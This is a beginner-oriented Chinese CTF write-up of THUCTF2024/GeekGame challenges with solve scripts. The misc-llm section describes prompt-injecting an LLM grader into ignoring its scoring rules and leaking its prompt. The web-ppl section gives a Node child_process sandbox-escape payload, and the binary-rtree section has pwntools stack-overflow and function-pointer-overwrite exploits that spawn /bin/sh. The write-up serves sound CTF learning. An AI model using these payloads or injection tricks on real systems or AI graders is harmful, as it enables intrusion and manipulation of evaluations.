# THUCTF2024 Writeup

萌新向题解，希望能帮到萌新！

## tutorial-signin

之前因为~~某些原因~~写了一个脚本解压当前目录下所有 zip 文件

```bash
alias unall='ls *.zip | xargs -n1 unzip -O CP936'
```

以 CP936 没记错的话是 GBK 编码解压。放在 ~/.bashrc 里。然后这题直接不断 unall 直到基本上深度够了，再用 grep 找 flag：

```bash
grep -e "flag{" -r .  # -e 表示设置要找的字符串，-r 表示递归目录查找， . 表示当前目录。
```

即可找到 flag。用时 1分40秒，你校二血，一血是 1分25秒。

## misc-trivia

第一题：搜到这个网页 https://k.sina.cn/article_6839256553_197a6c5e900100s1wc.html?from=edu，答案是：贺清华大学建校100周年

第二题：先搜是哪个小程序。小程序是燕园猫...。然后用 ifconfig 在 linux 上看自己 IP，在手机上网络那里设置代理为电脑上的 clash，在手机上访问这个小程序上的某只猫，在电脑上的 clash 里看 log 可以看到域名。后面这步不知道有没有更好的办法，比如去搜域名对应表。

![](screenshots/trivia-hostname.png)

第三题：搜到维基百科上的 [德语键盘](https://en.wikipedia.org/wiki/German_keyboard_layout)，有如下内容：The characters ², ³, {, [, ], }, \, @, |, µ, ~, and € are accessed by holding the AltGr key and tapping the other key. 一共 12 个。之前问 o1 分别给出了 11 个和 14 个的答案，属于是用 AI 用傻 了

## misc-llm

经过一些实验，这样可以炸出一些信息：

![200](screenshots/llm-1.png)

我们假设这些 prompt 是直接拼起来的，可以类似 sql injection 让它忽略前面（或后面）的评分标准。

![](screenshots/llm-2.png)

![](screenshots/llm-3.png)

后面一题是让它在写评语时输出前面这段话，具体 prompt 找不到了。

### misc-sunshine

第一部分比较简单，可以看到 --begin keyboard 类的 log，寻找变量可以发现 keyCode 是 hex 之后的一些编码。这个编码具体应该是 javascript keyCode。其中能转换为 ascii 的都可以直接转换。flag 里边是 onlyapplecando，当时因为把 flag 内容全输成大写卡了很久，还以为需要分析流量（为什么知道把 FLAG 改成小写不知道把内容改成小写！！）。

```python
with open("sunshine.log", "r") as fp:
    log = fp.read()

lines = log.splitlines()
kbds = []
for i, s in enumerate(lines):
    if 'Debug: --begin keyboard packet--' in s:
        kbds.append(''.join(lines[i:i+5]))

keys = []
for s in kbds:
    if 'keyAction [00000003]' in s:
        # Press
        #keyCode [8045]
        t = s.split("keyCode")[1][4:6]
        keycode = int(t, 16)
        keys.append(keycode)
        print(bytes([keycode]), s)

print(bytes(keys))
```



### misc-mario

前两题主要考察搭环境和搜索能力。在 windows 上下载 fceux 然后搜索 speedrun 记录，可以在一个网站上看到很多 TAS .fm2 记录。比如 [这个](https://tasvideos.org/2964S) 就是一个可行的记录。fm2 文件里面是普通的 txt，写一个脚本可以转成答案要提交的形式。在多一帧的情况上卡了一会，在本地运行发现 fm2 先转 bin 再转 fm2 确实会出问题，盯帧之后发现是差了一帧。后来死在结束动画，意识到要等一会才能结束。

```python
with open("./HappyLee_SMB_TAS.fm2", "r") as fp:
    s = fp.read()
    
s = s.splitlines()

ans = []
for t in s:
    if not t.startswith("|0"):
        continue
    print(t)
    t = t[3:11]
    # print(len(t), t)
    x = 0
    for c in t:
        x <<= 1
        if c!='.':
            x |= 1
    ans.append(x)

ans = bytes(ans)
with open("ans.bin", "wb") as fp:
    fp.write(ans)
```



第二题只有一个 [记录](https://tasvideos.org/7311S)。这里面有一个 txt 文件，格式差不多 。

```python
with open("./MinusWorldLog.txt", "r") as fp:
    s = fp.read()
    
s = s.splitlines()
#BK      = ['A', 'B', 'S', 'T', 'R', 'L', 'D', 'U']
#BUTTONS = ['A', 'B', 'S', 'T', 'U', 'D', 'L', 'R']

ans = []
for t in s:
    if not t.startswith("|..|"):
        continue
    # print(t)
    t = t[4:12]
    # print(len(t), t)
    x = 0
    for i, c in enumerate(t):
        if c!='.':
            x |= 1<<(i+4 if i<4 else 7-i)
    if 'S' in t:
        print(x)
    ans.append(x)

ans = bytes(ans)
with open("ans2.bin", "wb") as fp:
    fp.write(ans)
```



## web-copy

第一题可以在 F12 里复制明文的验证码，然后让 AI 写一个脚本把这些东西都模拟键盘打印上去。这应该是最不好并且最慢的办法了，但是我真就这样做的，中间还因为 pynput 的一些问题卡了一会。

第二题比较复杂，最后提示的做法是打印 PDF，比较厉害。首先是 F12 不能直接用了，然后我换 selenium 可以用（虽然好像写了脚本判断是否有 selenium，但是只有在 selenium 用了一些特殊功能才会触发）。这时候，HTML 里的东西是一大串 base64 不能直接解密，这些 base64 的头都是一样的，一种想法是搜这个 magic number 看看是什么格式但是没有搜到。我们要想办法在 javascript 里面定位怎么解密或者哪个变量是明文。我们使用网上的 [javascript deobfuscator](https://deobfuscate.relative.im/) 可以让一些东西，比如常数字符串显露出来，但奇怪的是直接在 burpsuite 里面 intercept javascript 成那个网站给的东西会无法显示，于是我只能对着 deobfuscated 的代码和原本的代码改。使用 alarm() 可以当作 print 用。

我们通过瞪眼法 + alarm 调试，以及搜索 decrypt 字样可以最终定位到 _0x3de341 这个变量存储了明文的验证码。在 burpsuite 里劫持 js 并且在得到明文的位置加入

```javascript
document.getElementById('noiseInput').value += _0x3de341;
```

即可直接将 flag 填充到输入框里。

怎么做了这么久最后就一行呢？？

## web-ppl

我恨 JS

提示前误打误撞过了后端。要是没过的话，我就提示前整个晚上一题没过了。

#### 后端

首先我们看 driver.sh，大概意思是我们需要执行 /tmp/print_flag2 并且把它的输出给输出到自己的输出。由于我不会 nodejs，让 GPT 写一个脚本，用到了 `require('child_process')`。放到 webppl 后端，没有 require，用不了。

然后精彩的思路来了，既然 nodejs 是一个非编译的东西，那我 require 它跟我把它的代码复制过来有什么区别？所以我们去搜它的 [代码](https://github.com/nodejs/node-v0.x-archive/blob/master/lib/child_process.js)，发现它用到了一个 process 变量，而这个变量是没有被定义过的，也就是说这是一个全局变量，我也可以用！我们写一个 `console.log(process.cwd())` 居然成功了！接着去网上搜这方面的 exploit，搜到了[这个](https://blog.csdn.net/cosmoslin/article/details/122166825)，payload 如下：

```javascript
global.process.mainModule.constructor._load('child_process').execSync('/tmp/print_flag2').toString()
```

这个会报错，但是无聊之下通过阅读报错发现 flag 的 ASCII 包含在报错里面了。

#### 前端

提示前做了 n 久，虽然提示后才做出来，但几个小时的努力也算比想象中要好。

题目会用 selenium 先运行 `console.log("<flag1>")` 然后删掉再运行我们的程序，返回给我们网页标题。我们阅读 js 执行部分相关内容之后发现了两个地方存放了 flag：一个是 lastMessages，另一个是 compileCache。但是这两个是闭包（这东西嵌套多了会丑的要死），我们无法访问一个函数内部的变量。后来我找了很久也没找到，唯一的可能是在闭包内执行 eval，这在代码中只能通过设置 `language="javascript"` 来解决，但是 language 一直都是 undefined。多亏了 openai o1，告诉了我 React 跟 DOM 有一些关系，可以把网页上的 element 对应到 DOM，最终定位到 React 内部 instance。[o1记录](https://chatgpt.com/share/6713b79e-5644-800a-86fe-2045c1028b5c)

![](screenshots/ppl-1.png)

在已经经过了两个小时的 javascript 瞪眼后，我又瞪了一个小时，还是没找到这个 DOM 里面能有什么东西存了历史记录，但直觉告诉我这是正确的做法。

放提示后，发现我前面的努力确实没有白费：提示告诉我们 flag 也同时存在于 CodeMirror 的 instance 当中。这次，不需要看别的 instance 了。经过几十分钟的瞪眼我们发现 CodeMirror 会存代码更新的历史记录，具体来说在 `document.querySelector('.ReactCodeMirror').__reactInternalInstance$<some-hash>._currentElement._owner._instance.codeMirror.doc.history` 里。（好奇为什么这个变量叫 doc）我们寻找 history.done[idx].changes[0].txt 可以得到 flag。

还有一个问题是如何修改网页标题。直接 `document.title="a"` 会报错，大概因为 webppl 要求所有变量都必须在定义时就被赋值，之后不能修改。这提示我们需要用函数测功能（side effects 叫啥来着？）。换成 `document.querySelector('title').setHTMLUnsafe("fuck2");` 可以发现确实修改成功了。

现在只需要暴力遍历所有 idx 就可以获得 flag。脚本在 ppl/solve.py，虽然写了线程但是会挂，所以是单线程的。似乎并没有想到更好的一次过的方法，因为所有变量都是不能被修改，不能写循环，构造 payload 不如一个一个试。好像本地复现一次也是一种更快的方法，但是我的评价是不如一个一个试，万一本地的环境没复现好就 GG 了。

## binary-racecar

简单题，虽然我开了 ghidra。由于第一个线程中间会 sleep，第二个线程会重新读取 size 的值，我们在第一个线程 sleep 的时候输入更大的 size 就好了。具体来说我们在 webshell 里面先输 4，然后随便输东西，过一秒输 32，就可以了。

## binary-pymaster

前两个 flag 有一个超简单非预期解：在 pwndbg 里输 `search flag`。几分钟就过了前两题。然后我们可以看到这个软件是 PyInstaller 封装的。通过层层解码（这应该不难吧）最后我们可以得到一个 0_O 的 python 代码。在经过了一些瞪眼之后感觉没法瞪眼出来，也不知道怎么开倒车把 flag 复现回去。于是我们使用 openai o1 模型，它居然看出来了这是 Splay！先生成随机的 key 把 flag 每个点放到 Splay 上，然后再 256 次随机打乱。输出是 Splay 前序遍历的结果。[o1记录](https://chatgpt.com/share/6713b977-48b0-800a-99ef-820ca0a5a8a1)

![](screenshots/pymaster-1.png)

接下来的就看似比较简单了，但实际上因为我跳过了 flag2，并且注意到前面有要求第一个 `random.randint(0, 65535)==54830`，我找了很久也没办法找到 random 的 seed。后来我看回题面发现了 flag2 的名字，然后再试着 grep 找 flag2，发现在 random.pyc 里面，也就是说这个 random 库是被修改过的。我们直接把它放在当前目录下就可以复现环境了。然后对着 Splay 倒着解码就可以了。其实不需要知道前面写的是什么，只需要在输入的时候给个排列就可以复现位置（吧？），那相当于 o1 看出来 Splay 并不影响做题。因为是第一个晚上所以拿了一血。

## binary-rtree

第一题是有个 backdoor。在分配内存的时候会用当前已经分配的大小加上将要分配的大小，如果超过范围就推出，否则就可以分配。使用 integer overflow，先分配一些东西，然后给一个 -25，这样会通过测试并且会传给 read 一个负数，unsigned 之后就会变得特别大，于是可以 stack overflow 返回 backdoor。由于 stack alignment 16-bytes 的需求，用 `ROPgadget --binary=rtree | grep ret` 找一个 `ret ;` 的 gadget，补上 8 bytes 就可以了。

```python
from pwn import *
import time

"""
node_tops store all the nodes' top address == next node's key
the stack on main store (key, ??? 12 bytes, siz+24, ??? 4 bytes, data)
"""
p = remote("prob12.geekgame.pku.edu.cn", 10012)
p.sendline("<token>")
time.sleep(1)

win_addr = 0x40122c
p.sendline(b"1")
p.sendline(b"1")
pad = 10
p.sendline(str(pad).encode())
p.sendline(b"AAAA")
time.sleep(0.1)
# p.interactive()

p.sendline(b"1")
p.sendline(b"2")
p.sendline(b"-25")
time.sleep(0.1)
# p.interactive()

padding = 462
payload = cyclic(padding) + p64(0x40101a) + p64(win_addr)  # 0x40101a is `ret` gadget
p.sendline(payload)
p.sendline(b"4")
p.interactive()
```



第二题是它会把函数 edit_node 的指针存在堆上来实现每个节点只能被修改一次的逻辑。我们还是用负数，因为只判断上界不判断下界，可以修改当前指针之前的位置。把第一个节点的 data 存成 "/bin/sh"，第二个节点进行一次修改，修改的时候给一个负数 -104 修改第一个节点的函数指针为 system 的 GOT 还是 PLT entry，然后修改第一个节点就可以执行 system("/bin/sh") 了。

```python
from pwn import *
import time

"""
malloc two kinds of payloads
1. metadata. 40 bytes, include (key, ptr to data malloc, size, addr of edit(at most edit once), ptr to next node)
2. data. malloc by the insert node process, pointed by the metadata.

exploit
Modify the stored address of 'edit' to 'system', and use edit to call system(data, size) with data='/bin/sh'
"""

# p = process("./rtree")
p = remote("prob13.geekgame.pku.edu.cn", 10013)
p.sendline(b"<token>")
time.sleep(1)

edit_addr = 0x4012a4
system_addr = 0x401060
p.sendline(b"1")
p.sendline(b"1")  # key
p.sendline(b"10")
p.sendline(b"/bin/sh")
time.sleep(1)

p.sendline(b"1")
p.sendline(b"2")  # key
p.sendline(b"10")
p.sendline(b"CCCCDDDD")
time.sleep(1)


offset = 104
p.sendline(b"3")
p.sendline(b"2")  # key
p.sendline(str(-offset).encode())
p.sendline(p64(system_addr))
# p.sendline(p64(edit_addr))
time.sleep(1)

# input(str(p.pid))
p.sendline(b"3")
p.sendline(b"1")  # key
# p.sendline(b"ls")
# p.sendline(b"cat flag.txt")
time.sleep(1)
p.interactive()
```



## binary-bigint

这题没有任何 symbols，一开始觉得完全不可做，没想到做出来了。

我们使用那个 MLM 反汇编，可以获得一些函数的内容，虽然很多都是错的。通过不断使用 pwndbg 打断点和 ghidra，我们可以逐渐定位出一些函数的功能并且在 ghidra 里重命名。这里的技巧应该是该跳过的跳、该猜的猜，最后发现很多函数都只是在复制内存？？每次都先问 MLM 那个函数是干什么的，这样也许可以节省时间。到关键时刻它真的能节省时间了，它成功识别出了跟高精度有关的函数：将一个字节流以 128 base 存到一个十进制大整数类里，大整数类是一个 int[]，第一个是长度，后面都是 0-9 的位。

![截图自 MLM 反编译网站](screenshots/bigint-int2big.png)

看得出来它识别出了功能但是细节没有识别好。另外还识别出了加法、乘法，只不过参数位置和目标参数位置不对。这样我们可以直接省略掉这些函数不看。这个程序里，整数操作都是三个指针参数，把第一个和第三个进行操作的结果存进第二个。

![](screenshots/bigint-1.png)

![](screenshots/bigint-2.png)

在经过几个小时的打断点调试之后，我成功复现了第一个 flag 的样式：把 flag 分成三段，每段以 128 进制存到一个高精度里，然后这三个大整数需要满足一个一元三次方程，方程的参数大约是 10^50 级别。我们使用 sympy 居然没有延迟地解出了这个方程，然后就解出了 flag。

```python
from pwn import *
from sympy import Symbol, solve, pprint

"""
A = 12 65 2f 2b 0f 0a 6d 23  7d 3d 75 73 7c 20 57 16  33 42 23
B = 0a 01 4c 0c 37 00 09 07  64 20 4c
C = 1b 10 0a 54 2a 3f 72 0c  4e 7e 49 1d 46 64 44 7e  31 41 4a 0e 41 69 3c 2a  00 29 2d 50

x^3 - Bx^2 + Ax - C = 0
"""

def hexstream_to_bigint(hexstream):
    a = bytes.fromhex(hexstream)
    b = 0
    assert len(a) == a[0]+1
    for x in a[1:]:
        assert x<128
        b = b*128 + x
    return b

A = hexstream_to_bigint("12 65 2f 2b 0f 0a 6d 23  7d 3d 75 73 7c 20 57 16  33 42 23")
B = hexstream_to_bigint("0a 01 4c 0c 37 00 09 07  64 20 4c")
C = hexstream_to_bigint("1b 10 0a 54 2a 3f 72 0c  4e 7e 49 1d 46 64 44 7e  31 41 4a 0e 41 69 3c 2a  00 29 2d 50")

def bigint_to_bytes(x):
    b = []
    while x:
        b.append(x%128)
        x>>=7
    return bytes(b[::-1])

# print(A)
def solve_cubic():
    x = Symbol('x')
    expr = x**3 - B*x**2 + A*x - C
    roots = solve(expr)
    print(roots)
    for r in roots:
        print(bigint_to_bytes(r))

solve_cubic()
```



第二个 flag 用到的取模操作没有被 MLM 解出，但是题目里说到了取模，所以这只能是取模。由于我不会 crypto，后面 RSA 的部分是用 [o1](https://chatgpt.com/share/6713bb8a-0740-800a-89da-a7060383e158) 做的。它教我 RSA 的公式，并且告诉我去一些网站分解大整数，居然第一个就成功分解了，我直呼内行。不得不说 AI 还是有点用处的，小模型 orchestra 的推理能力很强。

```python
from pwn import *
from sympy import Symbol, solve, pprint, mod_inverse, isprime, gcd

"""
Solve
flag^(2^16+1) == C % B
"""

def bigint_to_int(bigint: str):
    return int(bigint.replace(" ", "").replace("\n", "").replace("\r", "").replace("\t", "")[::-1])

# In pwndbg, use x/309dw <addr> to dump the 32-bits int sequence in the following format.
B = bigint_to_int("""
   	1	5	0
5	2	7	2
1	9	7	3
5	5	3	3
7	4	3	9
...
""")

C = bigint_to_int("""...""")

def break_rsa(B, C):
    p = 8335682821571478490352906606412138453297454194998876807433197708759168456488683327650734100655791032070103480011988622054095135235550008195677895679112113
    q = 8335682821571478490352906606412138453297454194998876807433197708759168456488683327650734100655791032147064777500485138827074940225766907860020163251546027
    assert p*q==B
    assert isprime(p)
    assert isprime(q)
    phi = (p-1)*(q-1)
    d = mod_inverse(65537, phi)
    _flag = pow(C, d, B)
    #print(_flag)
    print(bigint_to_bytes(_flag))
    
break_rsa(B, C)
```



## algo-complexity

SPFA 我们直接去知乎等地方搜，搜到了一个毛子写的[最直白的](https://codeforces.com/blog/entry/3730)：

```
n 2*n-3 1
1 2 1000000000 / 2
1 3 1000000000 / 3
1 4 1000000000 / 4
....
1 n 1000000000 / n
2 3 1
3 4 1
......
n-1 n 1
```

（不得不说国外的教材比国内好不知道多少，博客也高质量一些）

Dinic 由于退役多年我已经忘记实现细节，还是去知乎上搜，有人说二度图跑二分图匹配很慢，试了一下不是这样的，现在想起来好像是没有卡边的数量，如果每条边都把边权 $w$ 拆成：

```
1
1
1
1
...  repeats k times
w-k
```

应该是能卡的。

我的做法是根据 loj 上有强数据和 loj 能下载数据的线索，下载 loj 数据看怎么生成。一个叫做 `line_ex_negiizhao_1.in` 的数据是这样的：

```
1200 2396 1 1200
1 2 2147483647
2 1200 1
2 3 2147483647
3 1200 1
3 4 2147483647
4 1200 1
...
1197 1198 2147483647
1198 1200 1
1198 1199 2147483647
1199 1200 2147483647
```

这样边的数量还是没有用完，用上面那个方法把每条边权为 1 的边都重复很多个卡到边的数量上界，就可以过了。

## algo-gzip

肝了两个晚上（一晚上=8+小时）都没肝出来，看提示发现思路全错了！！！

gzip 分为 LZ77 和 Huffman code 两部分。对于字节流，先跑 LZ77，这个算法会生成一个序列，每个东西要么是一个 Literal [0, 255] 表示直接在答案后边加上这个字节，要么是一对 (offset, length) （可能反了或者名字错了）表示回到 offset 前，copy length 个字节到答案后边。这样，我们一共有超过 256 个 Symbol，如何区分一个 Literal 和一个 copy 的操作呢？使用 Huffman code，把所有 Symbol 都映射到可能不等长的 01 串上（或者说被映射）。然后我看提示前的做法一直是想让它用 fixed huffman code 也没想过换个思路，真是石乐志了

我们要看 gzip 的信息可以去搜 gzip parser github 等字眼，可以搜出 [infgen](https://github.com/madler/infgen)。通过阅读 help，可以在运行的时候加上 -dd 的 flag 看到每个 Symbol 对应的 bit 流：

```bash
./infgen -dd < text.gzip
```

首先控制 LZ77 不让它生成任何 Literal 以外的字符。根据提示，当有长度为 3 的重复子串时，LZ77 就会进行压缩，所以我们不生成这种。

第一个 flag 就是我们用 64 个 Symbols 包含 63 个字符 Literals 和 1 个不能取消并且只出现一次的 ending。给 [32, 94] 里的所有字符都让它们出现同样的次数，可以控制它们的 huffman code 长度都为 6（包括 ending）。先看下 [RFC](https://datatracker.ietf.org/doc/html/rfc1951#page-9) 对 Huffman code 的生成方式，这 63 个字符按顺序对应到 [0, 62] 的 huffman code，ending 会分配到 63。把对应的 huffman code 里 0 较少的放在前面，剩下的放后面，就可以了。具体生成不能包含长度为 3 的重复子串，我直接用不同步长循环遍历。这样一个大小为 $n$ 的 alphabet 可以构造出 $n^2$ 的字符长度，比 $O(n^3)$ 要少但是够用。由于代码实在是又臭又长（5KB）就不放了。

第二个 flag 就是我们不能管那个 bytes 的具体信息，因为压缩算法是以 bit 为单位的。先把它 unpackbits 成 bit 流，目标是让这个 bit 流能够被一棵编码树解码（可以在前面和后面补上东西）。先还是用 64 个 Symbol，但是这次出现了 match 的情况，改 padding 还是不行，换成 32 个 Symbol 还是会有 match，128 个就不够字符了，于是只能控制为不等长的。考虑构造 $m5$ 个 Symbols 的 code 长度为 5，$m6$ 个 Symbols 的 code 长度为 6，保证 $m5 \times 8 + m6 \times 4 = 256$ 就可以了。根据 RFC，先分配 length 较少的，于是最终的 huffman tree 是左子树一片为长度=5 的，右边的为长度=6 的。对于一对 $(m5, m6)$ 如果能够解码过程中不出现 ending 也就是 63，并且没有重复出现长度为 3 的子串，就可以用它做。写一个检验所有 $(m5, m6)$ 的脚本，一个较小的数值 $m5=1, m6=62$ 是可行的。也就是 code 00000 会被映射成第一个 Symbol，后面从 000010 到 111111 会被映射到第 [2, 63] 个 Symbol。

还是像第一题一样，控制第一个 Literal 的出现次数是其他的两倍，用不同步长循环遍历即可。如果把 alphabet 里第一个字符重复一次再生成循环，会导致这个字符连着出现两次，会与后面 bit 流产生 match，换成分开两组循环就可以了。

## algo-randomzoo

记号约定：下标从 0 开始，$flag_{i}$ 为 flag 第 $i$ 位的 ASCII，$n$ 为 flag 的长度，$s_i$ 为程序输出第 $i$ 位，$t_i$ 为生成的随机数的第 $i$ 位。其中，$s_i = t_i+flag_{i\%n}$ （不考虑取模，并且就算取模这个概率也可以忽略）。

#### C++

在网上找 C++ `rand()` 实现，一直都说是 LCG，但最后找到了 [这个](https://www.mathstat.dal.ca/~selinger/random/) 才是对的。注意尽量先拿 flag 写一个自己的随机数生成器来保证自己的实现跟真正使用的一样。省略一些细节之后，我们可以得出以下不等式：
$$
t_i \in [(t_{i-3} + t_{i-31})\% 2^{31}, \cdots +1]
$$
其中 $\cdots$ 表示左边。意思是状态里会把最后一位右移掉，+1 是因为被去掉的最低位可能发生进位。

现在我们得到了一大串 $s_i$ 的值，写成关于 $flag_i$ 的不等式是这样的：
$$
(s_i-flag_{i\%n}) \in [(s_{i-3}-flag_{(i-3)\%n}+s_{i-31}-flag_{(i-31)\%n})\%2^{31}, \cdots+1]
$$
其中 $flag$ 和 $n$ 是需要解的未知数，$s_i$ 是已知的。我们不知道 $n$ 的值，可以枚举。每个 $i$ 都会给三个 $flag_{i,j,k}$ 造成一个限制。为了不处理这个不等式，我们可以通过询问 1000 次来把这个区间不断放缩，这样每个不等式都会变成一个等式。如果存在不合法的不等式，说明枚举的 $n$ 是错的。然后我们把不等式变成等式之后可以化简为这样：
$$
flag_{i\%n} = flag_{(i-3)\%n} + flag_{(i-31)\%n} - d_i
$$
其中 $d_i$ 是通过 $s$ 的值算出来的，多半是负数。这样我们得到了方程组，但是我懒得写高斯消元，并且测出 $n=34$，这个 $flag$ 可以直接由 `flag{...}` 的信息递推出来。

#### Python

这个 mt19937 就难一些了。可以去维基百科或者在 [这里](https://www.anquanke.com/post/id/205861) 看伪代码。

首先，mt19937 中，以下这个过程是可逆的：

```python
    # 提取伪随机数
    def extract_number(self):
        if self.mti == 0:
            self.twist()
        y = self.mt[self.mti]
        y = y ^ y >> 11
        y = y ^ y << 7 & 2636928640
        y = y ^ y << 15 & 4022730752
        y = y ^ y >> 18
        self.mti = (self.mti + 1) % 624
        return _int32(y)
```

具体来说，后两个位运算操作可以刚好用一次位运算操作抵消，前两次需要使用递推。逆操作如下：

```python
def revert_bitop(x):
    """
    y = y ^ y >> 11
    y = y ^ y << 7 & 2636928640
    y = y ^ y << 15 & 4022730752
    y = y ^ y >> 18
    """

    # y = y ^ y>>18
    t = x >> 18
    x = x ^ t

    # y = y ^ y << 15 & 4022730752
    t = x & (2**17-1)
    x ^= t<<15 & 4022730752

    # y = y ^ y << 7 & 2636928640
    for i in range(7, 32):
        t = x>>(i-7)&1
        if t:
            x ^= 1<<i & 2636928640

    # y = y ^ y>>11
    for i in range(31, 10, -1):
        t = x>>i&1
        if t:
            x ^= 1<<i-11

    return x % 2**32
```

萌新 Tips: 可以先把一组 2000 的询问保存在本地，这样不用每次修改都重新问。脚本如下：

```python
def store_a():
    p = process("python task2.py", shell=True)
    # p = remote("prob16.geekgame.pku.edu.cn", 10016)
    # p.recvuntil(b"Please input your token: ")
    # p.sendline(b"<token>")
    a = []
    for i in range(2000):
        x = p.recvline()
        print(x)
        x = int(x.decode())
        a.append(x)
        p.sendline()

    with open("record.txt", "w") as fp:
        for x in a:
            fp.write(f"{x}\n")

    return a

def load_a():
    with open("./record-chal.txt", "r") as fp:
        return [int(x) for x in fp.read().splitlines()]

# a = store_a()
a = load_a()
```

接下来开始推一下式子

我们可以得出以下式子：
$$
t_{i+624} = \mathrm{MT}(t_i, t_{i+1}, t_{i+397}) \\
\begin{align}
s_{i+624} - flag_{(i+624)\%n} = \mathrm{MT}(&s_i-flag_{i\%n},\\
&s_{i+1}-flag_{(i+1)\%n},\\
&s_{i+397}-flag_{(i+397)\%n})
\end{align}
$$
其中 $\mathrm{MT}$ 可以当作是一个单向函数。它的产生过程是，先把后两个东西用前面的位运算打乱，然后计算一些东西，最后把计算的东西用前面位运算的逆操作还原。

这样每个 $s_i$ 会对四个位置产生一个限制，并且其中两个位置是相邻的。注意相邻的这个性质很重要。仍然考虑放缩的思路，先问 2000 个输出保证每组限制出现了两三次。如果两个相邻的位置是已知的，那么可以通过枚举第三个位置的值，计算所有限制得出的第四个位置的值，看看这些值是否一样来判断第三个位置的值是否正确。根据 `flag{...}\r` 和试出来 $n=30$ 的信息，这样已经足够解出完整的 flag，不需要进一步使用搜索算法。这个代码还是太丑了就不放了。

#### Go

解释在 [这里](https://medium.com/@vulbusters/exploring-gos-math-rand-b4ef0e841591) 注意模数写错了，可以在 [这里](https://cs.opensource.google/go/go/+/refs/tags/go1.20:src/math/rand/rng.go) 看到源码。

这题其实跟 C++ 的做法一样，也是卡进位可以卡到一个范围然后多问几次来把不等式变成等式。但是这题不能直接递推了，换成高斯消元就可以。

## algo-codegolf

#### prime

一开始考虑 OI 中根号的 trick，但其实卡不进去。后来发现“乘方”标了红字，然后想起来可以用费马小定理。用 2 和 3 就可以判断 500 以内的所有数了。

payload: `((501-2**(n-1)%n)//500)*((501-3**(n-1)%n)//500)`

#### Pell 1

用通项公式。一开始卡不进去，但是通项的第二个式子非常小，把它换成 1 即可。

payload: `((1+2**(1/2))**(n-1)+1)//8**(1/2)`

#### Pell 2

什么 OI 题

这题拿了你校一血，激动

首先这题需要返回一个 int，而 python 中所有沾上 float 的数之后都回不去了，所以我们需要放弃任何用 float 的想法。

几种试过的想法包括找根号 2 的有理数近似、矩阵乘法，但是都不行。

我们用 int 类型还可以做一个叫做多项式乘法和多项式乘方的东西：以 $M=10^{100}$ 为分界线，对于一个多项式比如 $f(x)=1+3x+2x^2$，我们计算 $f(M)$ 的值记作 $y$，这样 $y\%M$ 就是 $a_0=1$，$(y//M)\%M$ 就是 $a_1=3$，$(y//M^2)\%M$ 就是 $a_2=2$。考虑怎么把那个矩阵乘法改成多项式乘法，但是不行。

经过了一些吃饭之后，发现了一个好东西叫做：多项式除法。具体式子在 [这里](https://math.stackexchange.com/questions/1123570/generating-function-for-pell-numbers)，不过这个式子感觉没什么好推的。我们把目标多项式和除的那个多项式写出来，除一下就好了。但是一开始我做的是反着的，需要把第 200 个 pell 数也压到 payload 里（放宽提示后这个是可行的），想了很多方法发现最后无法逃脱信息熵的束缚。再想了想，其实我把两个东西都反过来，然后除一下，它就会把误差当作余数给去掉。然后就拿到了一血。

payload: `(10**(100*n)//(10**200-2*10**100-1))%(10**100)`

这中间其实还有很多辅助调试脚本。以下这个脚本应该是多项式反着做的。

```python
def fuck():
    # a = [0, 1, 2, 5, 12, 29, 70, 169, 408, 985, 2378, 5741, 13860, 33461, 80782, 195025, 470832, 1136689, 2744210]
    a = get_a()
    # print(a[200])
# a = a[::-1]
    print(len(a))
# Use polynomial multiplication (1-2x-x^2)

    M = 10**100

    a = np.array(a)
    poly = [1, -2, -1]
    poly = poly[::-1]
    poly = np.array(poly)
    b = np.convolve(a, poly)[:]
    print("a:", a.tolist())
    print("b:", b.tolist())

    def get_y(a, x):
        # print("Getting y of a:", a)
        s = 0
        for i, ai in enumerate(a):
            s += (x**i) * ai
        # print("Got y:", s)
        return s

    def get_poly(s, x, n):
        # print(s)
        a = []
        for i in range(n):
            t = s // x**i
            t = t % x
            if t>M/2:
                t -= M
            a.append(t)
        return a

    p = get_y(b.tolist(), M)
    q = get_y(poly.tolist(), M)
    print("p:", p)
    p = M**(len(b)-1)
    print("q:", q)
    print("Retrieved ans:", get_poly(p//q, M, 20))

    input()
```

